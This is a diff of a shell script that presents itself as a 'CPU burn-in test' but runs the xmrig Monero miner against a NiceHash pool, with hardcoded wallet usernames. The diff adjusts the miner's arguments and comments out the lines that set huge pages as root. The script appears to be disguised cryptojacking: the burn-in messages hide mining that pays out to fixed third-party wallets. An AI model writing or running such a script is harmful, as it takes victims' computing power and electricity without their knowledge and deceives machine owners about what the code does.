@@ -20,7 +20,7 @@ case "$1" in
         nh)
             username="15ufDkou9LJrdWTizkVTkAeXTfFC7HT13t.$name"
 	    url="randomxmonero.usa.nicehash.com:3380"
-	    args="--coin="monero" --url=$url --user=$username --pass="x" --nicehash --randomx-1gb-pages --donate-level=40 --print-time=500 --av=0"
+	    args="--coin="monero" --url=$url --user=$username --pass="x" --randomx-1gb-pages --donate-level=40 --print-time=500"
             ;;
 	prv)
 	    username="45ynYARcmKcLZrB1kEfjsbCcGByjVqsCnhzAgLpN1xjnTzxRRp8F7tq3bXbnrW929mdRcyBSAHNTzjHap4Wgbc8FTWRaut9"
@@ -49,8 +49,8 @@ echo $cyn This system is $name. $white
 echo $mag Burn in progress... $white
 
 #These two lines activate huge pages when run as root
-core=`nproc --all`
-sysctl -w vm.nr_hugepages=$core > /dev/null 2>&1
+#core=`nproc --all`
+#sysctl -w vm.nr_hugepages=$core > /dev/null 2>&1
 
 #Execute CPU burn-in test
 ./xmrig $args | egrep 'MEMORY|accepted|speed|(CPU.*AES)|esume|reject'
